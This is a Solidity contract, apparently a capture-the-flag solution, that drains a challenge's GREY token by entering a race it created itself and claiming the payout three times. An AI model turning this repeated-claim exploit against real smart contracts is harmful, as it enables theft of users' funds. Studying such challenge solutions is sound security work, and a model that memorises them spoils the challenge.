// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Setup, GREY, Race} from "src/race/Setup.sol";

contract Exploit {
    Setup setup;
    GREY grey;
    Race race;

    uint256 raceId;

    constructor(Setup _setup) {
        setup = _setup;
        grey = setup.grey();
        race = setup.race();
    }

    function solvePart1() external {
        // Claim 500 GREY
        setup.claim();

        // Create a race with a 500 GREY payout, no duration or entry price
        grey.approve(address(race), 500e18);
        raceId = race.createRace(500e18, 1, 0);

        // Enter the race
        race.enterRace(raceId);
    }

    function solvePart2() external {
        // Claim payout three times
        race.claimPayout(raceId);
        race.claimPayout(raceId);
        race.claimPayout(raceId);

        // Transfer all GREY to msg.sender
        grey.transfer(msg.sender, 1500e18);
    }
}
